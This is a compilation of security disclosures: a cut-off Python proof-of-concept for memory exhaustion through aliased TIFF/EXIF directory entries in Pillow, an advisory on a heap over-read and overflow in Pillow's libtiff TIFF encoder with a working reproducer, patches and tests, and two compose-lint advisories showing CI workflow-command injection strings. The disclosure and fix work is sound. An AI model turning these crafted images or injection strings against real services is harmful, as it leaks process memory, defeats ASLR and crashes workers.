#!/usr/bin/env python3
# ImageFileDirectory_v2.load(): N IFD entries that all alias the file body make
# Image.open() (TIFF) and getexif() (PNG eXIf etc.) retain ~N copies of the file.
# Pure Python, stock Pillow in /src. Needs ~1 GB RAM, runs in ~1 s.
import io, struct, resource
from PIL import Image
resource.setrlimit(resource.RLIMIT_AS, (4 << 30, 4 << 30))  # MemoryError, not OOM-killer

def aliased_ifd(n_alias, real=()):
    """Classic LE TIFF: header + one IFD. n_alias BYTE tags each cover the whole file."""
    n = len(real) + n_alias
    size = 8 + 2 + 12 * n + 4
    ents = {t: struct.pack("<HHLL", t, typ, 1, v) for t, (typ, v) in dict(real).items()}
    for t in range(1000, 1000 + n_alias):
        ents[t] = struct.pack("<HHLL", t, 1, size - 1, 1)      # BYTE[size-1] @ offset 1
    blob = b"II*\0" + struct.pack("<LH", 8, n) + b"".join(ents[t] for t in sorted(ents)) + b"\0" * 4
    assert len(blob) == size
    return blob

def rss():
    return next(int(l.split()[1]) << 10 for l in open("/proc/self/status") if l.startswith("VmRSS"))

# 1) TIFF: 1x1 L image (pixel = a header byte) + 6000 aliased private tags -> Image.open() only
real = {256: (3, 1), 257: (3, 1), 258: (3, 8), 259: (3, 1), 262: (3, 1),
        273: (4, 8), 278: (3, 1), 279: (4, 1)}
tif = aliased_ifd(6000, real)
r0 = rss(); im = Image.open(io.BytesIO(tif)); r1 = rss()
held_t = sum(len(v) for v in im.tag_v2._tagdata.values())
print(f"TIFF {len(tif)} B, {im.size} {im.mode}: Image.open() keeps {held_t >> 20} MiB of tag data "
      f"({held_t // len(tif)}x file); RSS {r0 >> 20} -> {r1 >> 20} MiB")

# 2) Same IFD as EXIF in a 1x1 PNG -> im.getexif() (what ImageOps.exif_transpose calls)
exif = aliased_ifd(6000)
buf = io.BytesIO(); Image.new("L", (1, 1)).save(buf, "PNG", exif=exif); png = buf.getvalue()
r0 = rss(); im2 = Image.open(io.BytesIO(png)); e = im2.getexif(); r1 = rss()

      f"RSS {r0 >> 20} -> {r1 >> 20} MiB")

entry.title: [Pillow] Pillow: Heap buffer overflow saving TIFF with libtiff when tags override image size
entry.content:
============================================================================
ANT-2026-CS7N494P  [high]  CWE-787  memory-safety
Heap buffer overflow saving TIFF with libtiff when tags override image size
Location: src/libImaging/TiffDecode.c:1035  in ImagingLibTiffEncode()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================

When Pillow saves an image as a compressed TIFF, size information taken from the image's metadata can make the encoder read past the end of a heap buffer. Someone who uploads an image can use this to get the server process's memory, including pointers, copied into the saved file, or to crash the process. When the metadata also enables TIFF "Predictor=2" compression, the encoder writes past the buffer instead, corrupting the heap and aborting the process. This affects applications that write TIFF through libtiff (any compression= other than raw) and either carry the source metadata across with exif=im.getexif() / tiffinfo=, or simply re-save a crafted palette TIFF with Image.open(f).save(out, "TIFF"), which inherits its compression and predictor from the upload.

In TiffImagePlugin._save's libtiff branch, only BitsPerSample is pinned to the real image when the tag list for the encoder is built (src/PIL/TiffImagePlugin.py:1955). ImageWidth, ImageLength and PlanarConfiguration are set from im.size but are then overwritten by the exif=/tiffinfo= merge loop at :1768-1772. SamplesPerPixel is never set for single-band modes, so a value from the caller's tags or from the source TIFF's own IFD reaches TIFFSetField. ImagingLibTiffEncode then passes a row buffer sized from the actual image (src/encode.c:291) to TIFFWriteScanline (src/libImaging/TiffDecode.c:1035) with no check against TIFFScanlineSize(), and libtiff consumes a full scanline of the tag-described width from it.

The attached reproducer demonstrates the read case. A 64x4 greyscale JPEG whose EXIF says SamplesPerPixel=3, Photometric=RGB is converted into a valid RGB TIFF in which 128 bytes of each row are live heap, including pointers that change from run to run. The same JPEG with EXIF ImageWidth=2**27 kills the process with SIGSEGV. For the write case, the values written are byte-wise differences of existing heap contents rather than attacker-chosen data, and nothing beyond the observed glibc abort is shown. The tiffinfo= route dates back to Pillow 2.3.0 (dbf47837ce99), and the exif= route to 8.4.0 (c0f619384cbc).

Details

When an image is saved as TIFF through the libtiff encoder (any compression= other than raw, or TiffImagePlugin.WRITE_LIBTIFF), libtiff sizes its scanline from the ImageWidth / SamplesPerPixel / BitsPerSample / PlanarConfiguration tags it was handed, Pillow sizes the encoder row buffer from the real image, and nothing compares the two. In TiffImagePlugin._save's libtiff branch only BitsPerSample is pinned in the attribute dict given to the encoder (atts, src/PIL/TiffImagePlugin.py:1955-1982); the other geometry tags can come from caller- or attacker-supplied data:

  • ImageWidth (256), ImageLength (257) and PlanarConfiguration (284) are set from im.size before the tiffinfo= / exif= merge loop at :1768-1772, so they are overwritten by it — by the EXIF of an uploaded JPEG, or by stale geometry in im.getexif() / im.tag_v2 of a TIFF that Pillow auto-transposed on load (Orientation tag) or that the application thumbnail()ed.
  • SamplesPerPixel (277) is only put in the IFD for multi-band modes (:1847-1850), so for single-band images (L, P, I;16, 1, …) a value from exif= / tiffinfo=, or from the source TIFF's own IFD via supplied_tags (im.tag_v2, :1782), is forwarded to libtiff. A palette TIFF with SamplesPerPixel=2, BitsPerSample=(8,8), ExtraSamples=(0,) opens as mode P (rawmode PX, extra sample dropped), and a bare im.save(out, "TIFF") — no save arguments; compression and Predictor are inherited from the source — already makes libtiff process 2*width bytes per row from a width-byte buffer.

ImagingLibTiffEncode then hands the image-sized row buffer to TIFFWriteScanline, and libtiff reads one scanline of the tag-described geometry out of a buffer holding one row of the actual image. With Predictor = 2 (also forwarded from tiffinfo= / im.tag_v2) libtiff's horizontal differencing first rewrites the whole scanline in place, so the over-read becomes an out-of-bounds heap write on every row.

The tags do not have to be supplied deliberately by the application: im.getexif() of an uploaded JPEG returns whatever IFD0 tags the file carries, and the common metadata-preserving conversion

im = Image.open(uploaded_jpeg)                                   # 64x4, mode "L"
im.save(out, "TIFF", exif=im.getexif(), compression="tiff_lzw")

behaves as follows on the stock build at this commit:

  • EXIF IFD0 {277: 3, 262: 2} (SamplesPerPixel=3, Photometric=RGB): the save succeeds and out is a 64x4 RGB TIFF. Re-opening it, the first 64 bytes of every 192-byte row are the image (0x11 fill); the remaining 128 bytes are heap that followed the 64-byte row buffer — e.g. ... 807a97e6527f0000 ... f03632e5527f0000 40832ee5527f0000 (x86-64 heap pointers), different on every run.
  • EXIF IFD0 {256: 1<<27} (ImageWidth=2^27): the process dies with SIGSEGV; gdb shows TIFFWriteScanline (libtiff.so.6) ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1035) ← _encode (src/encode.c:139).
  • valgrind on the first case: Invalid read of size 1 … TIFFWriteScanline … by ImagingLibTiffEncode … Address is 0 bytes after a block of size 64 alloc'd at calloc by _setimage.
  • Control: the same JPEG with an EXIF holding only Software produces a 64x4 L TIFF whose 256 pixel bytes are all 0x11.

The write variant needs nothing more than a well-formed 222-byte TIFF and the exif=im.getexif() idiom the project's own tests use (Tests/test_file_tiff.py::test_exif, test_modify_exif); the interpreter dies with glibc's free(): invalid next size (fast) (SIGABRT):

from PIL import Image; import io
b = io.BytesIO()
Image.new("RGB", (64, 4)).save(b, "TIFF", compression="tiff_lzw", tiffinfo={274: 6, 317: 2})  # Orientation=6, Predictor=2
im = Image.open(io.BytesIO(b.getvalue())); im.load()   # auto-transposed to 4x64; tag_v2/getexif() still say 64x4
im.save(io.BytesIO(), "TIFF", exif=im.getexif())       # or tiffinfo=im.tag_v2

Here libtiff processes 192-byte rows (64 px × 3 samples) from the 12-byte buffer _setimage allocated for a 4-pixel RGB row, and PredictorEncodeRow rewrites the 180 heap bytes that follow it on each of 64 rows; valgrind on a -g build reports Invalid write of size 1 … TIFFWriteScanline … by ImagingLibTiffEncode (TiffDecode.c:1035) … Address is 0 bytes after a block of size 12 alloc'd … by _setimage (encode.c:293). im.thumbnail((8, 8)) before the save instead of the Orientation tag reaches the same state, as does the purely programmatic Image.new("RGB", (128, 32)).save(fp, "TIFF", compression="tiff_lzw", tiffinfo={256: 1024, 257: 128, 317: 2}) (SIGSEGV). For the source-IFD SamplesPerPixel route, a crafted <2 KB palette PX TIFF with Compression = LZW, Predictor = 2 kills the stock build on a bare Image.open(f).save(out, "TIFF"); with a predictor-less codec the same re-save returns normally with width bytes of heap per row encoded into the output.

Walk-through

_save seeds the output IFD from the image and then copies the caller's tags over it:

# src/PIL/TiffImagePlugin.py
1746    libtiff = WRITE_LIBTIFF or compression != "raw"
1749    ifd[PLANAR_CONFIGURATION] = 1
1751    ifd[IMAGEWIDTH] = im.size[0]
1752    ifd[IMAGELENGTH] = im.size[1]
        …
1757    elif "exif" in encoderinfo:
1758        info = encoderinfo["exif"]          # Image.Exif, or bytes → Exif
        …
1768    for key in info:
            …
1772            ifd[key] = info.get(key)            # 256/257/277/262/284/317 … overwrite the above

The geometry is only partially re-asserted afterwards: BITSPERSAMPLE is always set, but SAMPLESPERPIXEL only for multi-band modes and IMAGEWIDTH/IMAGELENGTH never:

1847    if bits != (1,):
1848        ifd[BITSPERSAMPLE] = bits
1849        if len(bits) != 1:
1850            ifd[SAMPLESPERPIXEL] = len(bits)    # not reached for L, P, I, F, I;16 …
1856    if PHOTOMETRIC_INTERPRETATION not in ifd:   # supplied value kept

In the libtiff branch every IFD entry that is not block-listed — and, after the IFD, every entry of supplied_tags (the source file's im.tag_v2) not already present — becomes a TIFFSetField argument. The only tag pinned to the image's real value is BITSPERSAMPLE:

1955        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}
1959        for tag, value in itertools.chain(ifd.items(), supplied_tags.items()):
            …
1976            if tag not in atts and tag not in blocklist:
                    …   atts[tag] = value
2002        encoder = Image._getencoder(im.mode, "libtiff", a, encoderconfig)
2003        encoder.setimage(im.im, (0, 0, *im.size))

For the SamplesPerPixel=3 example the tag list passed to the encoder is [(256, 64), (257, 4), (258, 8), (259, 5), (262, 2), (277, 3), (278, 4), (284, 1)]; for the ImageWidth example it is [(256, 134217728), (257, 4), (258, 8), …]. 256 and 277 are in core_tags (src/encode.c:694), so PyImaging_LibTiffEncoderNew forwards them straight to TIFFSetField. For a single-band image SAMPLESPERPIXEL is absent from ifd, so the loop takes tag 277 from supplied_tags — the source TIFF's IFD — when one is present; the PLANAR_CONFIGURATION == 2 adjustment at :1783-1788 already compensates for this for separate-planes sources, the contiguous PX layout is the remaining case.

encoder.setimage sizes the packer's row buffer from the real image — 64 bytes for a 64-pixel L row:

/* src/encode.c, _setimage */
287    if (state->bits > 0) {
291        state->bytes = (state->bits * state->xsize + 7) / 8;
293        state->buffer = (UINT8 *)calloc(1, state->bytes);

and ImagingLibTiffEncode packs one image row into it and gives the pointer to libtiff with no length:

/* src/libImaging/TiffDecode.c */
1027        while (state->y < state->ysize) {
1028            state->shuffle(state->buffer, (UINT8 *)im->image[state->y + state->yoff] + …, state->xsize);
1035            if (TIFFWriteScanline(tiff, (tdata_t)(state->buffer), (uint32_t)state->y, 0) == -1) {

TIFFWriteScanline consumes TIFFScanlineSize() bytes, i.e. ImageWidth * SamplesPerPixel * BitsPerSample / 8 as set through the tags. Nothing between _save and line 1035 compares that with state->bytes. With SamplesPerPixel=3 libtiff reads 192 bytes from the 64-byte block and LZW-encodes the trailing 128 heap bytes into the strip; with ImageWidth=2^27 it reads 128 MiB starting at the 64-byte block and faults. With Predictor = 2, libtiff's PredictorEncodeRow first runs horizontal differencing in place over the whole scanline (bp[i] -= bp[i-stride]), i.e. it rewrites the heap bytes that follow the block before encoding them; libtiff grows ImageLength as rows beyond the declared count are written, so every row of the real image goes through. A PlanarConfiguration = 2 carried over from a planar source reaches libtiff by the same route; there libtiff's scanline (one sample plane) is shorter than Pillow's row, so the result is an undecodable file rather than an out-of-bounds access.

The non-libtiff path (compression absent/raw) is not affected: it goes through ImagingRawEncode, which treats the IFD-derived stride as padding and either zero-fills or fails with IMAGING_CODEC_CONFIG (src/libImaging/RawEncode.c:34-37,57-59). Overriding IMAGEWIDTH/IMAGELENGTH through tiffinfo on that path is an intended feature (Tests/test_file_tiff.py::test_tiff_chunks).

The exif= route was introduced in c0f619384cbc ("Added "exif" keyword argument to save Image.Exif instance", 2021-07-04), first released in 8.4.0. The same override through tiffinfo= is older: it dates back to dbf47837ce99 ("Add arbitrary tags to tiff images using an ImageFileDirectory", 2013-10-02, first in 2.3.0). The stale-geometry-from-the-file-itself form dates from 1b70a4c6b515 ("Use TIFF orientation", 2019-09-13, first in 6.2.0), which added the transpose on load.

Impact

Affected are applications that write TIFF output from user-supplied images through libtiff. Through the source-IFD SamplesPerPixel route nothing more is needed than Image.open(f).save(out, "TIFF") (format normalisation) on a crafted palette TIFF: Compression, SamplesPerPixel and Predictor are all inherited from the upload, so the uploader chooses between heap corruption / worker abort (Predictor = 2) and a normally-returning save whose output carries width bytes of the worker's heap per row. The exif= / tiffinfo= routes cover applications that convert to compressed TIFF while carrying the metadata across — im.save(..., "TIFF", compression="tiff_lzw"|"tiff_adobe_deflate"|"packbits"|"jpeg"|…, exif=im.getexif()), exif=im.info["exif"], or tiffinfo= built from the source file's tags. Neither option is a default, but both are ordinary settings for archival/print/scan pipelines and the idiom used in Pillow's own tests. The uploader then chooses the outcome through a few EXIF shorts: a small SamplesPerPixel (with a matching Photometric so the result is a valid RGB/CMYK TIFF) returns (spp-1) × width bytes of process heap per image row inside the produced file — for a 4000-pixel-wide upload that is 8 KB of heap per row, megabytes per file, readable with any TIFF decoder and containing allocator metadata, pointers (ASLR defeat) and whatever other requests left in freed memory; a large ImageWidth kills the worker with SIGSEGV; ImageWidth/ImageLength larger than the (transposed or thumbnailed) image together with Predictor = 2 writes (declared_width − real_width) × bytes_per_pixel bytes past a small fresh calloc block on every row — the values written are byte-wise differences of the existing heap contents, so the attacker controls extent and repetition but not directly the data; the observed result is heap corruption and abort of the whole worker, exploitation beyond that is not demonstrated. Because ImageWidth/ImageLength are routinely present in IFD0 of camera and scanner output, a benign photo that is resized before such a save also over-reads (its EXIF still describes the original width), so the crash variant can occur without an attacker.

Reproducing

repro is a single Python script that uses the installed Pillow and only its public API; no rebuild is needed. It runs in well under a second.

It builds the attacker's input in memory: a 64x4 JPEG in mode L with every pixel set to 0x11, plus a chosen set of EXIF IFD0 tags. It then runs the metadata-preserving conversion an application would do:

im = Image.open(io.BytesIO(jpeg))
im.save(out, "TIFF", exif=im.getexif(), compression="tiff_lzw")

Finally it re-opens the TIFF that comes out. There are three cases:

  • control: the EXIF holds only Software. The output is a 64x4 L TIFF whose 256 bytes are all 0x11. The verdict can only be BUG if this holds.
  • leak: the EXIF holds SamplesPerPixel=3, PhotometricInterpretation=RGB. libtiff now treats each scanline as 192 bytes, but the row buffer only holds 64 bytes. The save still succeeds and the output is a 64x4 RGB TIFF. In each 192-byte row, the first 64 bytes are the image (0x11). The other 128 bytes are whatever sat in the heap after the 64-byte row buffer.
    • The script hex-dumps row 0's extra bytes. They include x86-64 pointers such as …e06c297e677f0000, which change from run to run because of ASLR.
    • It also counts the extra bytes that are neither 0x11 nor 0x00, since those could not have come from the image or from zero padding. On the stock build this is a few hundred of the 512 bytes (200–310 in our runs).
  • crash: the EXIF holds ImageWidth=2**27. The script re-runs itself as a child process (repro crash) with core dumps disabled. libtiff tries to read 128 MiB out of the 64-byte buffer, and the child dies with SIGSEGV (exit code -11).

Expected output on the stock build (the heap bytes and the count vary):

control: L (64, 4), all bytes 0x11: True
leak:    RGB (64, 4)
         first 64 bytes of each row are the image (0x11): True
         row 0, bytes 64..192 (past the row buffer):
           0000000000000000310000000000000090e5b50669550000e06c297e677f0000
           0000000001007900007b8804d80c0d8830000000000000001007000000000000
           0100000000000000801a897e677f0000240300000000000030444a7d677f0000
           4095487d677f0000885f897e677f000003000001010000000000000000000000
         220 of 512 bytes past the row buffers are neither 0x11 nor 0x00
crash:   child exit code -11 (SIGSEGV)
BUG

The last line is BUG if the control is clean and the leak case produced foreign bytes, the crash case died with SIGSEGV/SIGBUS, or both. Otherwise it is OK.

With either attached patch applied and rebuilt, the script prints:

control: L (64, 4), all bytes 0x11: True
leak:    output is not a readable image (no over-read)
crash:   child exit code 0 (no signal)
OK

In the leak case, the fixed build writes the image's real single sample per pixel but keeps the supplied Photometric=RGB. Pillow will not open a TIFF like that.

The out-of-bounds write variant is the three-line Orientation=6, Predictor=2 snippet in Details (SIGABRT, free(): invalid next size (fast) on the stock build); for a file:line stack run it under valgrind on a -g build of the extensions.

Suggested fix

Two alternative patches are attached. Patch 2 is the Python-only subset of patch 1; patch 1 also hardens the C encoder.

Attached patch 1 (src/PIL/TiffImagePlugin.py, src/libImaging/TiffDecode.c) does two independent things:

  1. src/PIL/TiffImagePlugin.py:1955 — the libtiff branch already pre-seeds atts with BITSPERSAMPLE so that no supplied tag can replace it. The patch extends that to the other tags that determine libtiff's scanline size, taken from the image being saved:
-        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}
+        atts: dict[int, Any] = {
+            BITSPERSAMPLE: bits[0],
+            SAMPLESPERPIXEL: len(bits),
+            IMAGEWIDTH: im.size[0],
+            IMAGELENGTH: im.size[1],
+            PLANAR_CONFIGURATION: 1,
+        }

Doing it here rather than in the IFD built at 1749–1772 leaves the raw-writer behaviour exercised by test_tiff_chunks untouched, and because the merge loop visits ifd and supplied_tags only for tags not already in atts, it closes the exif=, tiffinfo= and source-IFD (im.tag_v2) routes alike. A supplied PHOTOMETRIC_INTERPRETATION still reaches the file (so EXIF {277:3, 262:2} now yields a 1-sample "RGB" TIFF that Pillow refuses to open); whether to force it to the mode's value is a format decision that no longer affects memory safety. For the re-saved PX palette case it may also be worth dropping the source's EXTRASAMPLES from supplied_tags (meaningless once the extra channel was discarded on load), as is already done for the planar case at :1783-1788, so the output is a self-consistent 1-sample palette file.

  1. src/libImaging/TiffDecode.c, ImagingLibTiffEncode — before the scanline loop, it refuses any configuration in which libtiff would read more than the packer produced, so the encoder stays safe regardless of where tags come from:
        if (TIFFScanlineSize64(tiff) > (uint64_t)state->bytes) {
            state->errcode = IMAGING_CODEC_CONFIG;
            ImagingLibTiffEncodeCleanup(state);
            clientstate->tiff = NULL;
            if (!clientstate->fp) {
                free(clientstate->data);
            }
            return -1;
        }

The same cleanup is applied to the existing TIFFWriteScanline error path. For in-memory output, that path currently frees clientstate->data but leaves clientstate->tiff set, so the later ImagingLibTiffEncodeCleanup → TIFFClose → TIFFFlush writes into the freed buffer. Both error paths now close the TIFF before the data is freed. The TIFFFlush failure branch further down (src/libImaging/TiffDecode.c:1056) has the same pattern and is left as it is.

Attached patch 2 (src/PIL/TiffImagePlugin.py only) is step 1 above without the C changes, for maintainers who prefer not to touch the encoder. It closes every public-API route (exif=, tiffinfo=, a resized or transposed image's carried-over EXIF/tag_v2) by which these tags reach TIFFSetField. ImagingLibTiffEncode still trusts its tag list, though, and the error-path use-after-free described above stays as it is.

Both patches add Tests/test_file_libtiff.py::test_geometry_tags, parametrised over oversized IMAGEWIDTH/IMAGELENGTH, SAMPLESPERPIXEL=3 and PLANAR_CONFIGURATION=2. With either patch applied to a clean checkout and rebuilt, repro prints OK, the Predictor = 2 snippet in Details saves a 4×64 image normally, and the existing TIFF test suites still pass.

The patch (1 of 2)

Take libtiff scanline geometry tags from the image, not tiffinfo/exif, and make ImagingLibTiffEncode reject a scanline larger than its row buffer

Applies to src/PIL/TiffImagePlugin.py at the commit above.

diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py

--- a/Tests/test_file_libtiff.py
+++ b/Tests/test_file_libtiff.py

+        (
+            {TiffImagePlugin.IMAGEWIDTH: 1 << 27},

+            {TiffImagePlugin.PLANAR_CONFIGURATION: 2},
+        ),
+    )
+    def test_geometry_tags(
+        self, tiffinfo: dict[int, int], monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+    ) -> None:
+        # The geometry of the image is used, not the geometry from tiffinfo.
+        # Otherwise libtiff would read past the end of the row buffer.
+        monkeypatch.setattr(TiffImagePlugin, "WRITE_LIBTIFF", True)
+
+        out = tmp_path / "temp.tif"
+        im = hopper("L")

+

+++ b/src/PIL/TiffImagePlugin.py
@@ -1952,7 +1952,16 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -> None:
         ]

-        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}
+        # The tags that determine the size of a scanline are taken from the image,
+        # not from tiffinfo/exif: libtiff reads a scanline of the size that they

+        atts: dict[int, Any] = {
+            BITSPERSAMPLE: bits[0],

-                if (clientstate->fp) {
-                    TIFFCleanup(tiff);
-                    clientstate->tiff = NULL;
-                } else {

+                clientstate->tiff = NULL;
+                if (!clientstate->fp) {

The patch (2 of 2)

The reproducer

Reproducer — repro, 4,352 bytes (click to open)

Its last line is BUG when the issue triggers and OK when it does not. Re-run on a clean build of that commit it printed BUG.

#!/usr/bin/env python3
"""
Heap over-read in Pillow's libtiff encoder, driven by EXIF tags of an uploaded file.

An application converts an uploaded JPEG to compressed TIFF and keeps its metadata:

    im.save(out, "TIFF", exif=im.getexif(), compression="tiff_lzw")

TiffImagePlugin._save forwards the EXIF's ImageWidth (256) / SamplesPerPixel (277) to
libtiff, so libtiff's scanline size follows the EXIF, while the row buffer that
ImagingLibTiffEncode hands to TIFFWriteScanline (src/libImaging/TiffDecode.c:1035) is
sized from the real image (src/encode.c:291). libtiff reads past the end of it.

  control  EXIF {Software}                       -> 64x4 "L" TIFF, every byte 0x11
  leak     EXIF {SamplesPerPixel=3, Photometric=RGB}
                                                 -> 64x4 "RGB" TIFF: 64 image bytes + 128
                                                    bytes of process heap in every row
  crash    EXIF {ImageWidth=2**27}               -> libtiff reads 128 MiB from a 64-byte
                                                    buffer: SIGSEGV
"""
import io
import resource
import signal
import subprocess
import sys

from PIL import Image, UnidentifiedImageError

W, H, GREY = 64, 4, 0x11


def uploaded_jpeg(exif_tags):
    """The attacker's file: a 64x4 solid-grey JPEG whose EXIF IFD0 holds exif_tags."""
    exif = Image.Exif()
    exif.update(exif_tags)
    buf = io.BytesIO()
    Image.new("L", (W, H), GREY).save(buf, "JPEG", quality=100, exif=exif.tobytes())
    return buf.getvalue()


def convert_to_tiff(jpeg):
    """The application: metadata-preserving conversion to LZW TIFF.

    Returns the resulting TIFF re-opened, or None if Pillow cannot read it back."""
    im = Image.open(io.BytesIO(jpeg))
    out = io.BytesIO()
    im.save(out, "TIFF", exif=im.getexif(), compression="tiff_lzw")
    try:
        return Image.open(out)
    except UnidentifiedImageError:
        return None


if sys.argv[1:] == ["crash"]:
    # Child process for the crash case (see the end of the script).
    convert_to_tiff(uploaded_jpeg({256: 1 << 27}))  # ImageWidth = 2**27
    sys.exit(0)


# --- Control: EXIF without geometry tags converts cleanly ----------------------------
tiff = convert_to_tiff(uploaded_jpeg({305: "control"}))  # Software
control_clean = (tiff.mode, tiff.size) == ("L", (W, H)) and set(tiff.tobytes()) == {GREY}
print(f"control: {tiff.mode} {tiff.size}, all bytes 0x{GREY:02x}: {control_clean}")


# --- Leak: EXIF says 3 samples per pixel, so libtiff reads 3*64 bytes per row --------
# from the 64-byte row buffer. Everything past byte 64 of each row is not image data.
tiff = convert_to_tiff(uploaded_jpeg({277: 3, 262: 2}))  # SamplesPerPixel, Photometric=RGB
leaked = False
if tiff is None:
    # A fixed build writes the image's real 1 sample per pixel, and Pillow will not
    # open a 1-sample "RGB" TIFF: nothing was read past the row buffer.
    print("leak:    output is not a readable image (no over-read)")
else:
    pixels = tiff.tobytes()
    row = W * 3
    image_part = b"".join(pixels[y * row : y * row + W] for y in range(H))
    beyond = b"".join(pixels[y * row + W : (y + 1) * row] for y in range(H))
    # Bytes that are neither the image's grey nor zero padding can only be heap contents.
    foreign = sum(b not in (GREY, 0) for b in beyond)
    print(f"leak:    {tiff.mode} {tiff.size}")
    print(f"         first {W} bytes of each row are the image (0x{GREY:02x}): "
          f"{set(image_part) == {GREY}}")
    print(f"         row 0, bytes {W}..{row} (past the row buffer):")
    for i in range(W, row, 32):
        print("           " + pixels[i : i + 32].hex())
    print(f"         {foreign} of {len(beyond)} bytes past the row buffers are neither "
          f"0x{GREY:02x} nor 0x00")
    leaked = foreign > 0


# --- Crash: EXIF says the image is 2**27 pixels wide ---------------------------------
child = subprocess.run(
    [sys.executable, __file__, "crash"],
    preexec_fn=lambda: resource.setrlimit(resource.RLIMIT_CORE, (0, 0)),  # no core file
    capture_output=True,
)
crashed = child.returncode in (-signal.SIGSEGV, -signal.SIGBUS)
outcome = signal.Signals(-child.returncode).name if child.returncode < 0 else "no signal"
print(f"crash:   child exit code {child.returncode} ({outcome})")


print("BUG" if control_clean and (leaked or crashed) else "OK")

entry.title: [compose-lint] compose-lint: File paths embedded in pull requests can inject CI workflow commands through command-line error messages
entry.content:
Impact

0.31.0 fixed GHSA-6f4g-xm8v-pgv6, where text from a Compose file became GitHub Actions workflow commands in compose-lint's output. The fix escapes the command openers in compose-lint's own output, but not in the argument parser's error messages. When a repository path reaches compose-lint's arguments without a -- before it, the argument parser prints it raw in its error message. That includes a carriage return, which the runner treats as a line break, so a command can also start a new line there.

A pull request can therefore create annotations, fold or hide parts of the job log, or issue other commands the runner accepts, when CI runs compose-lint over it, before anyone reviews it. The pass/fail result is not changed.

Affected setups pass repository paths to compose-lint without a -- before them: the pre-commit hook when args: is set without the documented trailing --, or the compose-lint package or Docker image called that way in a workflow. The pre-commit hook's default configuration passes -- and is not affected. The GitHub Action turns command processing off around each compose-lint run, so it is not affected.

Found during an internal pre-1.0 security review. It was first published as part of GHSA-r7j4-crjv-h467, together with four other gaps in the same fix. Each gap now has its own advisory.

Docker image. composelint/compose-lint tag 0.31.0 and the matching minor tag are affected, as was latest while it pointed to 0.31.0.

Releases before 0.31.0 are covered by GHSA-6f4g-xm8v-pgv6.

Patches

Fixed in 0.32.0. The argument parser's messages go through the same sanitizer as the rest of compose-lint's output.

Workarounds

  • Upgrade to 0.32.0 or later.
  • End the pre-commit hook's args: with --, and put -- before file paths when calling compose-lint directly.
  • On GitHub Actions, use the tmatens/compose-lint Action, or bracket the compose-lint step with ::stop-commands::<random token> and ::<token>::, as the Action does.

Reproduction

On compose-lint 0.31.0 on a GitHub-hosted runner (runner 2.337.0), compose-lint '--##[warning]X/compose.yml' with no -- creates an annotation. The same path after -- creates none. The composelint/compose-lint:0.31.0 image produces byte-identical output to the package.

References

  • https://github.com/tmatens/compose-lint/security/advisories/GHSA-8v59-qmwv-4p6q
  • https://nvd.nist.gov/vuln/detail/CVE-2026-125123
  • https://github.com/tmatens/compose-lint/pull/945
  • https://github.com/tmatens/compose-lint/commit/542e63126f795564a65c63887ea0dc558a500688
  • https://github.com/tmatens/compose-lint/releases/tag/v0.32.0
  • https://github.com/advisories/GHSA-8v59-qmwv-4p6q

entry.title: [compose-lint] compose-lint: Text in a pull request can issue CI workflow commands through JSON and SARIF output on stdout
entry.content:
Impact

0.31.0 fixed GHSA-6f4g-xm8v-pgv6, where text from a Compose file became GitHub Actions workflow commands in compose-lint's output. --format json and --format sarif output never passed through that fix, so ##[ inside a service name or other value reaches the log intact when the output is printed to stdout rather than written to a file. The runner acts on ##[ in the middle of a line, so the JSON layout does not prevent it.

A pull request can therefore create annotations, fold or hide parts of the job log, or issue other commands the runner accepts, when CI runs compose-lint over it, before anyone reviews it. The pass/fail result is not changed.

Affected setups print JSON or SARIF output to a CI log from the compose-lint package, the pre-commit hook or the Docker image. Writing that output to a file, which SARIF upload requires, is not affected. The GitHub Action turns command processing off around each compose-lint run, so it is not affected.

Found during an internal pre-1.0 security review. It was first published as part of GHSA-r7j4-crjv-h467, together with four other gaps in the same fix. Each gap now has its own advisory.

Docker image. composelint/compose-lint tag 0.31.0 and the matching minor tag are affected, as was latest while it pointed to 0.31.0.

On compose-lint 0.31.0 on a GitHub-hosted runner (runner 2.337.0), a service named a##[warning]X, linted with --format json or --format sarif to stdout, creates annotations.
